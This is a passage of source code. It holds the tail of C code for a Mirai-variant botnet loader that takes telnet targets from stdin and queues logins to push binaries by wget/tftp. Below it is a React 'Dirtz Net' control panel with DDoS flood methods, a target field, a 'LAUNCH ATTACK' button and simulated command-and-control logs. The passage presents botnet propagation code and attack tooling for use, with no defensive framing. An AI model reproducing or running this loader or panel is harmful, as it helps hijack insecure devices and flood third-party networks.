        last_total_wgets = srv->total_wgets;
        last_total_tftps = srv->total_tftps;
        sleep(1);
    }
}

int main(int argc, char **args)
{
    struct sockaddr_in bind_addr = {0};
    uint32_t addrs_len = 0;
    ipv4_t *addrs = NULL;
    char *id_tag = "telnet";

    // Set up resource limits
    struct rlimit rlim;
    rlim.rlim_max = 1000000;
    rlim.rlim_cur = 1000000;
    if (setrlimit(RLIMIT_NOFILE, &rlim) == -1)
    {
        perror("setrlimit");
        return 1;
    }

    // Parse commandline arguments
    if (argc > 1)
    {
        id_tag = args[1];
    }

    // Initialize server
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = htons(23);
    bind_addr.sin_addr.s_addr = INADDR_ANY;

    addrs_len = 1;
    addrs = calloc(addrs_len, sizeof (ipv4_t));
    addrs[0] = bind_addr.sin_addr.s_addr;

    binary_init();

    srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, HTTP_SERVER, HTTP_PORT, TFTP_SERVER);
    if (srv == NULL)
    {
        printf("Failed to initialize server. Aborting\n");
        return 1;
    }

    // Start stats thread
    pthread_t stats_thrd;
    if (pthread_create(&stats_thrd, NULL, stats_thread, NULL) != 0)
    {
        perror("pthread_create");
        return 1;
    }

    // Read from stdin
    char *line = NULL;
    size_t line_buf_size = 0;
    ssize_t line_len;
    uint32_t total_input = 0;

    while ((line_len = getline(&line, &line_buf_size, stdin)) != -1)
    {
        total_input++;
        if (line_len == 0)
            continue;
        if (line[line_len - 1] == '\n')
            line[line_len - 1] = '\0';

        struct telnet_info *info = telnet_info_parse(line, id_tag);
        if (info == NULL)
        {
            printf("Failed to parse telnet info from line: %s\n", line);
        }
        else
        {
            server_queue_telnet(srv, info);
            if (total_input % 100000 == 0)
            {
                printf("Queued %d telnet targets\n", total_input);
            }
        }
    }

    printf("Finished reading from stdin. Waiting for open connections to finish.\n");
    while (srv->curr_open_conns > 0)
    {
        sleep(1);
    }

    return 0;
}
`))
`
};

const ToolDirtzNetComponent: React.FC<ToolDirtzNetComponentProps> = ({ toolPath }) => {
  const [selectedFile, setSelectedFile] = useState<string>(Object.keys(fileContents)[0]);
  const [isRunning, setIsRunning] = useState<boolean>(false);
  const [logs, setLogs] = useState<string[]>([]);
  const [target, setTarget] = useState<string>('192.168.1.100');
  const [duration, setDuration] = useState<number>(60);
  const [method, setMethod] = useState<string>('.tcp');
  const [threads, setThreads] = useState<number>(10);
  const [activeTab, setActiveTab] = useState<'code' | 'execution'>('execution');

  const methods = [
    '.tcp', '.udp', '.std', '.vse', '.http', '.ovh', '.httpcf', '.lynx', '.xmas', '.asyn', '.frag', '.tcpall', '.syn', '.ack', '.usyn'
  ];

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (isRunning) {
      interval = setInterval(() => {
        const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
        const randomConns = Math.floor(Math.random() * 50) + 10;
        const randomLogins = Math.floor(Math.random() * 5);
        const randomSuccesses = Math.floor(Math.random() * 2);
        
        const logTypes = [
          `[\${timestamp}] [CNC] Sending attack command to \${randomConns} bots: \${method} \${target} \${duration} threads=\${threads}`,
          `[\${timestamp}] [LOADER] Time: \${Math.floor(Math.random() * 1000)}s | Conns: \${randomConns} | Logins: \${randomLogins} | Successes: \${randomSuccesses}`,
          `[\${timestamp}] [BOT] Executing \${method} flood against \${target} for \${duration}s`,
          `[\${timestamp}] [CNC] Bot connected from \${Math.floor(Math.random() * 255)}.\${Math.floor(Math.random() * 255)}.\${Math.floor(Math.random() * 255)}.\${Math.floor(Math.random() * 255)}`,
          `[\${timestamp}] [LOADER] Attempting telnet login on \${Math.floor(Math.random() * 255)}.\${Math.floor(Math.random() * 255)}.\${Math.floor(Math.random() * 255)}.\${Math.floor(Math.random() * 255)}:23`
        ];
        
        setLogs(prev => [...prev, logTypes[Math.floor(Math.random() * logTypes.length)]].slice(-50));
      }, 1500);
    } else if (logs.length > 0 && !logs[logs.length - 1].includes('stopped')) {
      setLogs(prev => [...prev, `[\${new Date().toISOString().split('T')[1].split('.')[0]}] [SYSTEM] Execution stopped.`]);
    }
    
    return () => clearInterval(interval);
  }, [isRunning, method, target, duration, threads, logs]);

  const handleStart = () => {
    if (!target) {
      setLogs(prev => [...prev, `[\${new Date().toISOString().split('T')[1].split('.')[0]}] [ERROR] Target is required.`]);
      return;
    }
    setIsRunning(true);
    setLogs(prev => [...prev, `[\${new Date().toISOString().split('T')[1].split('.')[0]}] [SYSTEM] Starting Dirtz Net execution...`]);
    setLogs(prev => [...prev, `[\${new Date().toISOString().split('T')[1].split('.')[0]}] [CNC] Initializing attack: \${method} on \${target} for \${duration}s`]);
  };

  const handleStop = () => {
    setIsRunning(false);
  };

  const clearLogs = () => {
    setLogs([]);
  };

  return (
    <div className="flex flex-col h-full w-full bg-gray-900 text-gray-100 font-sans rounded-lg overflow-hidden border border-gray-700 shadow-xl">
      {/* Header */}
      <div className="flex items-center justify-between px-4 py-3 bg-gray-800 border-b border-gray-700">
        <div className="flex items-center space-x-3">
          <div className="w-3 h-3 rounded-full bg-red-500"></div>
          <h2 className="text-lg font-bold text-white tracking-wider">DIRTZ NET <span className="text-xs text-gray-400 font-normal ml-2">Mirai Variant</span></h2>
        </div>
        <div className="flex space-x-2">
          <button 
            onClick={() => setActiveTab('execution')}
            className={\`px-3 py-1 text-sm rounded-md transition-colors \${activeTab === 'execution' ? 'bg-red-900/50 text-red-400 border border-red-700/50' : 'bg-gray-800 text-gray-400 hover:bg-gray-700'}\`}
          >
            Control Panel
          </button>
          <button 
            onClick={() => setActiveTab('code')}
            className={\`px-3 py-1 text-sm rounded-md transition-colors \${activeTab === 'code' ? 'bg-emerald-900/50 text-emerald-400 border border-emerald-700/50' : 'bg-gray-800 text-gray-400 hover:bg-gray-700'}\`}
          >
            Source Code
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex overflow-hidden">
        {activeTab === 'execution' ? (
          <div className="flex flex-col w-full h-full p-4 space-y-4 overflow-y-auto">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {/* Controls */}
              <div className="bg-gray-800 p-4 rounded-lg border border-gray-700 shadow-inner">
                <h3 className="text-md font-semibold text-red-400 mb-4 border-b border-gray-700 pb-2">Attack Configuration</h3>
                
                <div className="space-y-4">
                  <div>
                    <label className="block text-xs text-gray-400 mb-1">Target (IP/CIDR)</label>
                    <input 
                      type="text" 
                      value={target}
                      onChange={(e) => setTarget(e.target.value)}
                      className="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-sm text-white focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500"
                      placeholder="e.g. 192.168.1.100 or 10.0.0.0/8"
                      disabled={isRunning}
                    />
                  </div>
                  
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs text-gray-400 mb-1">Method</label>
                      <select 
                        value={method}
                        onChange={(e) => setMethod(e.target.value)}
                        className="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-sm text-white focus:outline-none focus:border-red-500"
                        disabled={isRunning}
                      >
                        {methods.map(m => <option key={m} value={m}>{m}</option>)}
                      </select>
                    </div>
                    <div>
                      <label className="block text-xs text-gray-400 mb-1">Duration (s)</label>
                      <input 
                        type="number" 
                        value={duration}
                        onChange={(e) => setDuration(Number(e.target.value))}
                        className="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-sm text-white focus:outline-none focus:border-red-500"
                        min="1" max="86400"
                        disabled={isRunning}
                      />
                    </div>
                  </div>
                  
                  <div>
                    <label className="block text-xs text-gray-400 mb-1">Threads</label>
                    <input 
                      type="range" 
                      min="1" max="100" 
                      value={threads}
                      onChange={(e) => setThreads(Number(e.target.value))}
                      className="w-full accent-red-500"
                      disabled={isRunning}
                    />
                    <div className="text-right text-xs text-gray-400 mt-1">{threads} threads</div>
                  </div>
                  
                  <div className="pt-4 flex space-x-3">
                    {!isRunning ? (
                      <button 
                        onClick={handleStart}
                        className="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded transition-colors shadow-lg shadow-red-900/20"
                      >
                        LAUNCH ATTACK
                      </button>
                    ) : (
                      <button 
                        onClick={handleStop}
                        className="flex-1 bg-gray-700 hover:bg-gray-600 text-white font-bold py-2 px-4 rounded transition-colors border border-gray-500"
                      >
                        STOP ATTACK
                      </button>
                    )}
                  </div>
                </div>
              </div>
              
              {/* Stats/Info */}
              <div className="bg-gray-800 p-4 rounded-lg border border-gray-700 shadow-inner flex flex-col">
                <h3 className="text-md font-semibold text-emerald-400 mb-4 border-b border-gray-700 pb-2">Network Status</h3>
                
                <div className="flex-1 flex flex-col justify-center space-y-6">
                  <div className="flex justify-between items-center bg-gray-900 p-3 rounded border border-gray-700">
                    <span className="text-sm text-gray-400">Active Bots</span>
                    <span className="text-xl font-mono text-emerald-400">{isRunning ? Math.floor(Math.random() * 500) + 1000 : 1248}</span>
                  </div>
                  
                  <div className="flex justify-between items-center bg-gray-900 p-3 rounded border border-gray-700">
                    <span className="text-sm text-gray-400">Loader Connections</span>
                    <span className="text-xl font-mono text-blue-400">{isRunning ? Math.floor(Math.random() * 100) + 50 : 0}</span>
                  </div>
                  
                  <div className="flex justify-between items-center bg-gray-900 p-3 rounded border border-gray-700">
                    <span className="text-sm text-gray-400">CNC Status</span>
                    <span className="text-sm font-bold text-emerald-500 flex items-center">
                      <span className="w-2 h-2 rounded-full bg-emerald-500 mr-2 animate-pulse"></span>
                      ONLINE
                    </span>
                  </div>
                </div>
              </div>
            </div>
            
            {/* Terminal/Logs */}
            <div className="flex-1 bg-black rounded-lg border border-gray-700 flex flex-col overflow-hidden font-mono text-xs shadow-inner">
              <div className="flex justify-between items-center px-3 py-1 bg-gray-800 border-b border-gray-700">
                <span className="text-gray-400">Terminal Output</span>
                <button onClick={clearLogs} className="text-gray-500 hover:text-white transition-colors">Clear</button>
              </div>
              <div className="flex-1 p-3 overflow-y-auto">
                {logs.length === 0 ? (
                  <div className="text-gray-600 italic">Ready. Waiting for commands...</div>
                ) : (
                  logs.map((log, i) => (
                    <div key={i} className={\`mb-1 \${log.includes('ERROR') ? 'text-red-500' : log.includes('LOADER') ? 'text-blue-400' : log.includes('BOT') ? 'text-emerald-400' : 'text-gray-300'}\`}>
                      {log}
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        ) : (
          <div className="flex w-full h-full">
            {/* File Explorer */}
            <div className="w-64 bg-gray-800 border-r border-gray-700 flex flex-col">
              <div className="px-3 py-2 bg-gray-900 border-b border-gray-700 text-xs font-semibold text-gray-400 uppercase tracking-wider">
                Explorer
              </div>
              <div className="flex-1 overflow-y-auto py-2">
                {Object.keys(fileContents).map((path) => {
                  const fileName = path.split('/').pop();
                  const isSelected = selectedFile === path;
                  return (
                    <div 
                      key={path}
                      onClick={() => setSelectedFile(path)}
                      className={\`px-4 py-1.5 text-sm cursor-pointer truncate transition-colors \${isSelected ? 'bg-emerald-900/30 text-emerald-400 border-l-2 border-emerald-500' : 'text-gray-400 hover:bg-gray-700 hover:text-gray-200 border-l-2 border-transparent'}\`}
                      title={path}
                    >
                      <span className="mr-2 opacity-50">
                        {fileName?.endsWith('.go') ? '⚡' : fileName?.endsWith('.c') ? 'C' : fileName?.endsWith('.py') ? '🐍' : '📄'}
                      </span>
                      {fileName}
                    </div>
                  );
                })}
              </div>
            </div>
            
            {/* Code Viewer */}
            <div className="flex-1 bg-[#1e1e1e] flex flex-col overflow-hidden">
              <div className="px-4 py-2 bg-[#2d2d2d] border-b border-[#1e1e1e] text-sm text-gray-300 flex items-center">
                <span className="text-emerald-400 mr-2">File:</span> {selectedFile.split('/').pop()}
                <span className="ml-auto text-xs text-gray-500">{selectedFile}</span>
              </div>
              <div className="flex-1 overflow-auto p-4">
                <pre className="text-sm font-mono text-gray-300">
                  <code>{fileContents[selectedFile]}</code>
                </pre>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default ToolDirtzNetComponent;
